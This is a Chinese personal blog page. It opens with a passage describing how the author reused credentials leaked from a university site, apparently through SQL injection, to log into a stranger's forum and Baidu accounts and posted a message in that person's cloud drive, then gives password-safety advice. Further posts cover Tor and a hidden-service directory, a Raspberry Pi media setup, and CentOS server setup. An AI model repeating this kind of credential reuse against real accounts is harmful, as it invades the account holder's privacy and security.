<p>下一步就是借助强大的Google查找该用户的踪迹。看截图:<br><img src="http://ww1.sinaimg.cn/large/005WMcFzjw1f1oplcex63j31700rh7eo.jpg" alt=""><br>尝试以该用户的用户名及密码登入沪江英语论坛，成功。<br>发现该用户还用此昵称注册百度账号，尝试以用户名密码登入，成功:-)<br>登入百度账号可以做什么大家可以随意想象，我是不会告诉你们我进了他的度盘给他留了个言的ˊ_&gt;ˋ<br><img src="http://ww3.sinaimg.cn/large/005WMcFzjw1f1opyfcew8j31400cwaen.jpg" alt=""></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这个可能是本世纪最低级的黑客行为，但不可否认它是有效的。我们通过分析这次渗透找出应对的措施。  </p>
<ul>
<li>该高校校园网存在sql注入漏洞，直接导致大量用户信息泄漏，这是起因。</li>
<li>密码太简单，直接导致在线md5破解很容易查出明文。</li>
<li>多处使用相同用户名和密码，一个账户信息外泄致使所有账户存在安全风险。</li>
</ul>
<p>如何应对？</p>
<ul>
<li>使用强密码是行之有效的措施</li>
<li>避免使用固定的用户名和密码，尤其是在一些安全没有保证的小站上</li>
<li>开启两步验证等方式，（手机验证码）</li>
</ul>
<p>最后的最后，很多人问密码太多记不住咋办？<br>下面问题来了：如何优雅的管理密码?<br>给大家分享一个好用的软件<a href="https://github.com/mwgg/passera" target="_blank" rel="external">passera</a>。</p>
<blockquote>
<p>A simple tool that allows users to have strong unique passwords for each website, without the need to store them either locally or with an online service. It is available as a command-line tool for Linux/Mac/Windows and an Android app.</p>
</blockquote>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="//schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2016/03/06/2016-03-13-tor/" itemprop="url">
                  使用tor隐藏自己的踪迹和深网
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2016-03-06T19:40:25+08:00" content="2016-03-06">
              2016-03-06
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp;
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/渗透入侵/" itemprop="url" rel="index">
                    <span itemprop="name">渗透入侵</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          

          
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="tor是什么"><a href="#tor是什么" class="headerlink" title="tor是什么"></a>tor是什么</h3><p>官方的介绍简单翻译下：   </p>
<blockquote>
<p>tor是一个免费软件和开放的网络，可以帮助你防御网络流量嗅探(一种会威胁个人自由和隐私的网络监视)。用tor可以保护商业机密，社会激进分子，军事机密，和一些学者的研究成果。</p>
</blockquote>
<p>（渣翻译请自行体会其中重点）<br>来自<a href="https://www.torproject.org/" target="_blank" rel="external">torproject.org</a>  </p>
<h3 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h3><h4 id="配置Vidalia"><a href="#配置Vidalia" class="headerlink" title="配置Vidalia"></a>配置Vidalia</h4><p>据我所知，有三种办法使用tor:   </p>
<ol>
<li>使用tor的命令行版(比较复杂)  </li>
<li>使用Vidalia(GUI版本，目前已经停止维护)  </li>
<li>使用tor browser(最简单)  </li>
</ol>
<p>我使用的是Vidalia，可以在这个地方下载<a href="https://dist.torproject.org/vidalia-bundles/" target="_blank" rel="external">Vidalia</a>，貌似没有for Linux？<br>Vidalia的配置比较简单，前提是可以科学上网，因为万能的某长城貌似已经全面封锁了tor。<br><img src="http://ww2.sinaimg.cn/large/005WMcFzjw1f1vkfm9sdjj30e50fdabl.jpg" alt="screenshot"><br>选择Settings,<br><img src="http://ww1.sinaimg.cn/large/005WMcFzjw1f1vkgzqmhpj30kg0k2act.jpg" alt="screenshot"><br>选择我使用代理连接互联网，这里我的本地1080端口运行的是shadowsocks的代理。并选择我的ISP提供商封锁了tor网络的连接，并添加网桥.<br>注意，网桥可以向bridges@torproject.org发送一封内容为get bridges的邮件获得。<br>其他的设置不用管，点connect，洋葱变绿时说明连接上了tor。   </p>
<h4 id="配置chrome"><a href="#配置chrome" class="headerlink" title="配置chrome"></a>配置chrome</h4><p>强推一个插件SwitchyOmega,可以快速在切换浏览器代理设置。<img src="http://ww3.sinaimg.cn/large/005WMcFzjw1f1vkqfccksj313w0g5n02.jpg" alt=""></p>
<p>左侧+New Profile，如图配置9050端口即可。<br>访问下面这个页面看看配置是否成功:<a href="https://check.torproject.org/" target="_blank" rel="external">checktor</a></p>
<p>###Deep Web(深网)<br>使用tor代理，访问下面的页面试试：<a href="http://zqktlwi4fecvo6ri.onion/wiki/" target="_blank" rel="external">The Hidden Wiki</a><br>是的，这里充满各种违法的信息，比特币洗钱，军火交易，假身份……这就是人们常说的地下黑产聚集地，这就是deep web。你可以找到各种各样的信息，会遇到各种各样疯狂的人。这里高度自治，如果你足够强大也可以与之对抗。<br>一个挺不错的聊天室链接<a href="http://tetatl6umgbmtv27.onion/" target="_blank" rel="external">chat with stangers</a>，在这里我遇到了无所事事的美国年轻黑客，对中国文化很感兴趣；也偶遇了做运维的美国大叔，耐心的给我讲解perl……有两点要注意:</p>
<ol>
<li>不要泄露个人信息</li>
<li>英语要好，lol</li>
</ol>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="//schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2016/02/27/2016-02-27-pi/" itemprop="url">
                  娱乐向---Raspberry Pi搭建家庭影音娱乐系统
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2016-02-27T14:46:15+08:00" content="2016-02-27">
              2016-02-27
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp;
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/嵌入式开发/" itemprop="url" rel="index">
                    <span itemprop="name">嵌入式开发</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          

          
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <ul>
<li>Raspberry Pi比较入门的玩法就是用它来实现电视机机顶盒的一些功能，大家都知道树莓派上有大名鼎鼎的XBMC影音播放系统，安装完后完全可以当作网络机顶盒使用。但是我今天不会介绍XBMC，在我的方案里我通过树莓派将iPhone的音频直接输出到电视上，另外使用omxplayer进行视频播放。</li>
</ul>
<h3 id="安装和配置无线网卡"><a href="#安装和配置无线网卡" class="headerlink" title="安装和配置无线网卡"></a>安装和配置无线网卡</h3><p>至于为什么要配置无线网卡，答案很简单—电视机旁边没网线。我这儿正好有一块Ralink公司生产的RT2571无线网卡，把它连接到树莓派上，效果如图～ 因为我没鼠标和键盘，就只好先拿网线连路由用ssh配置无限网卡啦。<img src="http://ww2.sinaimg.cn/mw690/005WMcFzjw1f1dp0ao9wnj31kw23u1kx.jpg" alt="连接了RT2571的树莓派"><br>接下来使用:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">dmesg | grep usb</div></pre></td></tr></table></figure></p>
<p>看下无线网卡识别是否正常，找到输出的信息中有这些:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[    3.340509] usb 1-1.3: Product: 54M.USB.......</div><div class="line">[    3.346769] usb 1-1.3: Manufacturer: Ralink</div></pre></td></tr></table></figure></p>
<p>说明网卡已经正确识别，测试下能否搜索到无线信号:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo iwlist wlan0 scan</div></pre></td></tr></table></figure></p>
<p>结果见下图:<br><img src="http://ww4.sinaimg.cn/mw690/005WMcFzjw1f1dp4r087jj30ve0jwgr1.jpg" alt="screenshot"><br>接下来配置无线网卡，使用vim打开网络配置文件:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo vim /etc/network/interfaces</div></pre></td></tr></table></figure></p>
<p>我的配置文件像这样:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"># interfaces(5) file used by ifup(8) and ifdown(8)</div><div class="line"># Please note that this file is written to be used with dhcpcd</div><div class="line"># For static IP, consult /etc/dhcpcd.conf and &apos;man dhcpcd.conf&apos;</div><div class="line"># Include files from /etc/network/interfaces.d:</div><div class="line">source-directory /etc/network/interfaces.d</div><div class="line">auto lo</div><div class="line">#iface lo inet loopback</div><div class="line">iface eth0 inet dhcp</div><div class="line">auto wlan0</div><div class="line">allow-hotplug wlan0</div><div class="line"># iface wlan0 inet manual</div><div class="line"># wpa-roam /etc/wpa_supplicant/wpa_supplicant.conf</div><div class="line"># iface default inet dhcp</div><div class="line">iface wlan0 inet dhcp</div><div class="line">wpa-ssid &quot;yourssid&quot;</div><div class="line">wpa-psk &quot;password&quot;</div></pre></td></tr></table></figure></p>
<p>将其中的<code>wpa-ssid</code>和<code>wpa-psk</code>换成你的无线网络名和密码即可。<br>一般来说重新启动下树莓派无线网络即可自动连接。</p>
<h3 id="Shairport让树莓派支持AirPlay"><a href="#Shairport让树莓派支持AirPlay" class="headerlink" title="Shairport让树莓派支持AirPlay"></a>Shairport让树莓派支持AirPlay</h3><p>首先介绍下AirPlay，内容来源<a href="https://support.apple.com/zh-cn/HT204289" target="_blank" rel="external">Apple support</a>:  </p>
<blockquote>
<p>借助 AirPlay，您可以将音乐、照片和视频流化到 Apple TV，或者将音乐流化到 AirPort Express 或已启用 AirPlay 的扬声器。借助 AirPlay 镜像，您可以在 Apple TV 上显示 iOS 屏幕。  </p>
</blockquote>
<p>我们通过一个开源软件shairport让树莓派支持Apple的AirPlay。你可以提前连接独立声卡和音响。至于为什么需要独立声卡，你可以插上耳机感受下树莓派的底噪，音质感人～</p>
<h4 id="安装shairport及其依赖包"><a href="#安装shairport及其依赖包" class="headerlink" title="安装shairport及其依赖包"></a>安装shairport及其依赖包</h4><p>在终端执行如下命令:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install  libao-dev libssl-dev git avahi-utils libwww-perl</div><div class="line">sudo apt-get install libcrypt-openssl-rsa-perl libio-socket-inet6-perl  libmodule-build-perl</div></pre></td></tr></table></figure></p>
<p>然后在合适的地方建个文件夹，cd到文件夹目录接着:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/njh/perl-net-sdp.git</div><div class="line">cd perl-net-sdp</div><div class="line">perl Build.PL</div><div class="line">./Build</div><div class="line">./Build test</div><div class="line">sudo ./Build install</div><div class="line">cd ..</div><div class="line">git clone https://github.com/abrasive/shairport.git</div><div class="line">cd shairport</div><div class="line">make</div></pre></td></tr></table></figure></p>
<p>运行shairport:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./shairport -a &quot;raspberry pi&quot;</div></pre></td></tr></table></figure></p>
<p>之后在iPhone或者iPad上就可以看到这个AirPlay的选项，如图:<br><img src="http://ww3.sinaimg.cn/mw690/005WMcFzjw1f1dvytz5awj30hs0vkada.jpg" alt=""><br><img src="http://ww3.sinaimg.cn/mw690/005WMcFzjw1f1dvz5gmb3j30hs0vk3zh.jpg" alt=""><br>享受音乐吧(☆_☆)</p>
<h3 id="omxplayer播放器"><a href="#omxplayer播放器" class="headerlink" title="omxplayer播放器"></a>omxplayer播放器</h3><p>omxplayer是没有图形界面的，只能通过命令行来操作，不过它麻雀虽小五脏具全。<br>在终端中直接输入omxplayer就会出现相关的帮助信息，还给出了示例。在这里我就不介绍它的具体用法了。   </p>
<h3 id="一点心得"><a href="#一点心得" class="headerlink" title="一点心得"></a>一点心得</h3><p>因为开源硬件得天独厚的软件生态，树莓派可DIY的东西被无限延伸。操作起来也并不像人们想象的那么复杂，不是计算机相关专业的同学们也可以快速上手。在我这次的尝试中发现了一些小小的问题。可能是树莓派制作成本的限制，其音频输出相当的糟糕，干扰非常严重。想用树莓派直接用HDMI连接电视做高清机顶盒的同学们一定记得给树莓配上一块独立声卡，HDMI的音频输出也是相当糟糕=)</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="//schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2016/02/19/2016-02-19-vps/" itemprop="url">
                  centos搭建LNMP服务器
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2016-02-19T14:20:15+08:00" content="2016-02-19">
              2016-02-19
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp;
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/服务器/" itemprop="url" rel="index">
                    <span itemprop="name">服务器</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          

          
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <ul>
<li>我们首先来看一张图片:<img src="http://ww3.sinaimg.cn/large/005WMcFzjw1f14m96z58dj313t0odagt.jpg" alt="Fuck DDOS">    </li>
<li>前天折腾完apache，顺便装好了MySQL和PHP，放了一个Discuz!的开源论坛程序，什么乱七八糟权限都没管，全是弱密码。刚准备写个博纪念一下，发现我VPS被人黑了……无奈只好重新安装一遍centos。在<a href="http://lyeec.me" target="_blank" rel="external">vagarlee</a>的建议下，我吸取上一次的教训，使用更轻量的Nginx来替代Apache。</li>
</ul>
<h3 id="安装Nginx"><a href="#安装Nginx" class="headerlink" title="安装Nginx"></a>安装Nginx</h3><p>在使用yum安装Nginx的时候有一些小小的麻烦,需要自己建立一个<code>nginx.repo</code>的软件源配置文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vim /etc/yum.repo.d/nginx.repo</div></pre></td></tr></table></figure></p>
<p>在其中填写如下内容:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">[nginx]</div><div class="line">name=nginx repo</div><div class="line">baseurl=http://nginx.org/packages/centos/$releasever/$basearch/</div><div class="line">gpgcheck=0</div><div class="line">enabled=1</div></pre></td></tr></table></figure></p>
<p>保存，使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum -y install nginx</div></pre></td></tr></table></figure></p>
<p>nginx安装完成。<br>启动Nginx服务:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/etc/init.d/nginx start</div></pre></td></tr></table></figure></p>
<p>这个时候访问VPS的IP地址应该就能出现Nginx的欢迎页面了。</p>
<h3 id="安装MySQL"><a href="#安装MySQL" class="headerlink" title="安装MySQL"></a>安装MySQL</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum install mysql-server mysql mysql-deve</div></pre></td></tr></table></figure>
<p>我第一次安装MySQl的时候想当然只安装了mysql，并没有安装mysql-server导致数据库无法使用，mysql-server是一个服务端，需要安装。<br>启用MySQl服务:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">service mysqld start</div></pre></td></tr></table></figure></p>
<p>这时候会出现长长的提示信息，恭喜数据库安装成功。<br>接下来我们给数据库设置管理员账号和密码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysqladmin -u root password &apos;yourpassword&apos;</div></pre></td></tr></table></figure></p>
<h3 id="安装PHP"><a href="#安装PHP" class="headerlink" title="安装PHP"></a>安装PHP</h3><p>这一步比较简单，直接使用yum:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum install php-fpm php-mysql</div></pre></td></tr></table></figure></p>
<ul>
<li>至此，LNMP环境的软件包已经全部安装完成，下面就是简单的配置阶段。</li>
</ul>
<h3 id="配置PHP"><a href="#配置PHP" class="headerlink" title="配置PHP"></a>配置PHP</h3><p>更改下面的文件:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vim /etc/php.ini</div></pre></td></tr></table></figure></p>
<p>将1改为0<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cgi.fix_pathinfo = 0</div></pre></td></tr></table></figure></p>
<p>这儿有一段英文解释，来自<a href="www.digitalocean.com">digitalocean</a>:</p>
<blockquote>
<p>If this number is kept as a 1, the php interpreter will do its best to process the file that is as near to the requested file as possible. This is a possible security risk. If this number is set to 0, conversely, the interpreter will only process the exact file path—a much safer alternative.</p>
</blockquote>
<h3 id="配置Nginx"><a href="#配置Nginx" class="headerlink" title="配置Nginx"></a>配置Nginx</h3><p>主要是改一下Nginx.conf这个文件夹里的配置文件:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vim /etc/nginx/conf.d/default.conf</div></pre></td></tr></table></figure></p>
<p>改成了这样:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">server&#123;</div><div class="line"></div><div class="line">    listen       80;</div><div class="line">    server_name  localhost;</div><div class="line"></div><div class="line">    #charset koi8-r;</div><div class="line">    #access_log  /var/log/nginx/log/host.access.log  main;</div><div class="line"></div><div class="line">    location / &#123;</div><div class="line">        root   /usr/share/nginx/html;</div><div class="line">        index  index.html index.htm index.php;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    #error_page  404              /404.html;</div><div class="line"></div><div class="line">    # redirect server error pages to the static page /50x.html</div><div class="line">    #</div><div class="line">    error_page   500 502 503 504  /50x.html;</div><div class="line">    location = /50x.html &#123;</div><div class="line">        root   /usr/share/nginx/html;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    # proxy the PHP scripts to Apache listening on 127.0.0.1:80</div><div class="line">    #</div><div class="line">    #location ~ \.php$ &#123;</div><div class="line">    #    proxy_pass   http://127.0.0.1;</div><div class="line">    #&#125;</div><div class="line"></div><div class="line">    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000</div><div class="line">    #</div><div class="line">    location ~ \.php$ &#123;</div><div class="line">        root           /usr/share/nginx/html;</div><div class="line">        fastcgi_pass   127.0.0.1:9000;</div><div class="line">        fastcgi_index  index.php;</div><div class="line">        fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;</div><div class="line">        include        fastcgi_params;</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
<ul>
<li>改<code>server_name</code>后面的地址为<code>localhost</code></li>
<li>改<code>location</code>中的<code>root</code>地址为<code>/usr/share/nginx/html</code></li>
<li>在index        index.html        index.htm后加上index.php</li>
<li>把<code>&quot;location ~ \.php$ {&quot;,</code>前的注释去了，改<code>fastcgi_param</code>后面的内容为<code>SCRIPT_FILENAME  $document_root</code></li>
</ul>
<p>保存退出后打开php-fpm的配置:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vim /etc/php-fpm.d/www.conf</div></pre></td></tr></table></figure></p>
<p>找到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">; Unix user/group of processes</div><div class="line">; Note: The user is mandatory. If the group is not set, the default user&apos;s group</div><div class="line">;	will be used.</div><div class="line">; RPM: apache Choosed to be able to access some dir as httpd</div><div class="line">user = nginx</div><div class="line">; RPM: Keep a group allowed to write in log dir.</div><div class="line">group = nginx</div></pre></td></tr></table></figure></p>
<p>改成<code>User=nginx</code>，<code>group=nginx</code><br>重新启动php-fpm即可</p>
<h3 id="参考的文档"><a href="#参考的文档" class="headerlink" title="参考的文档"></a>参考的文档</h3><p><a href="http://nginx.org/en/docs/" target="_blank" rel="external">Nginx官方文档</a><br><a href="https://support.rackspace.com/how-to/installing-nginx-and-php-fpm-setup-for-nginx/" target="_blank" rel="external">Installing Nginx and php-fpm - Setup For Nginx</a><br><a href="https://www.nginx.com/resources/wiki/start/topics/examples/phpfcgi/" target="_blank" rel="external">Nginx -PHP FastCGI Example</a></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="//schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2016/02/16/2016-02-16-vps/" itemprop="url">
                  centos搭建服务器－安装apache
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            <span class="post-meta-item-icon">
              <i class="fa fa-calendar-o"></i>
            </span>
            <span class="post-meta-item-text">发表于</span>
            <time itemprop="dateCreated" datetime="2016-02-16T10:40:25+08:00" content="2016-02-16">
              2016-02-16
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp;
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/操作系统/" itemprop="url" rel="index">
                    <span itemprop="name">操作系统</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          

          
          

          
        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <ul>
<li><p>好久都没更新博客里面的文章了，快要开学了发现寒假自己什么都没搞出来啊啊啊……最蛋疼的是学校的智能车比赛的网站，要实现论坛的功能。学校的服务器现在又不让用，只好在我自己的VPS上搭建一个简易的服务器来测试了。这是我开始自己搭服务器过程的记录，可能会有点乱……</p>
</li>
<li><p>我在本地使用的是Mac OS X，远程服务器运行的是centos-6 x86系统。这个VPS是在<a href="https://bandwagonhost.com/" target="_blank" rel="external">Bandwagon</a>上购买的，可以使用shadowsocks科学上网(咦，我好像说了什么不该说的)。</p>
</li>
</ul>
<p>##LAMP环境<br>所谓LAMP就是Linux+apache+MySQL+PHP，我目前只装好了apache……不然怎么能是万里长征第一步～</p>
<p>###安装Apache<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">yum install httpd</div><div class="line">chkconfig --level 235 httpd on</div><div class="line">/etc/init.d/httpd start</div></pre></td></tr></table></figure></p>
<p>安装完后在浏览器中输入远程服务器的IP地址，看到这样的画面就说明安装成功了。<img src="http://ww2.sinaimg.cn/large/005WMcFzjw1f11dv2fa1hj31700rh15c.jpg" alt="屏幕快照"></p>
<p>###配置ssh<br>配置ssh的目的在于方便的上传和下载文件，更加流畅的终端输入体验……<br>在终端中输入如下命令:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum install openssh-server</div></pre></td></tr></table></figure></p>
<p>安装完成后启动sshd服务:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/etc/init.d/sshd start</div></pre></td></tr></table></figure></p>
<p>设置开机启动:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chkconfig sshd on</div></pre></td></tr></table></figure></p>
<p>我在本地使用:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh root@138.128.197.11</div></pre></td></tr></table></figure></p>
<p>报错<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh: connect to host 138.128.197.11 port 22: Connection refused</div></pre></td></tr></table></figure></p>
<p>我用<code>netstat -antp |grep sshd</code>命令查看了一下，系统的响应是这样的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tcp        0      0 0.0.0.0:22           0.0.0.0:*                   LISTEN      3746/sshd</div></pre></td></tr></table></figure></p>
<p>问题应该是出在了ssh的隧道没有对公网开放<br>修改ssh的配置文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vim /etc/ssh/sshd_config</div></pre></td></tr></table></figure></p>
<p>把<code>ListenAddress 0.0.0.0</code>改为<code>ListenAddress 138.128.197.11</code>这个是我远程服务器的IP，重新启动ssh服务发现无法启动，终端提示要先定义端口，我并不知道为什么……在刚刚那行配置前加上<code>port 22</code>然后<code>service sshd restart</code>，居然就成功了<br>附上成功后的图<br><img src="http://ww4.sinaimg.cn/large/005WMcFzjw1f11duxql7pj313r0p0167.jpg" alt="屏幕快照"> </p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      

      <section class="site-overview sidebar-panel  sidebar-panel-active ">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="//schema.org/Person">
          <img class="site-author-image" itemprop="image"
               src="http://ww4.sinaimg.cn/large/005WMcFzjw1f91geowlt0j31d91d9qnl.jpg"
               alt="Hsmouc" />
          <p class="site-author-name" itemprop="name">Hsmouc</p>
          <p class="site-description motion-element" itemprop="description">乱七八糟的个人学习生活记录</p>
        </div>
        <nav class="site-state motion-element">
          <div class="site-state-item site-state-posts">
            <a href="/archives">
              <span class="site-state-item-count">32</span>
              <span class="site-state-item-name">日志</span>
            </a>
          </div>

          
            <div class="site-state-item site-state-categories">
              <a href="/categories">
                <span class="site-state-item-count">8</span>
                <span class="site-state-item-name">分类</span>
              </a>
            </div>
          

          
            <div class="site-state-item site-state-tags">
              <a href="/tags">
                <span class="site-state-item-count">19</span>
                <span class="site-state-item-name">标签</span>
              </a>
            </div>
          

        </nav>

        

        <div class="links-of-author motion-element">
          
        </div>

        
        

        
        

      </section>

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
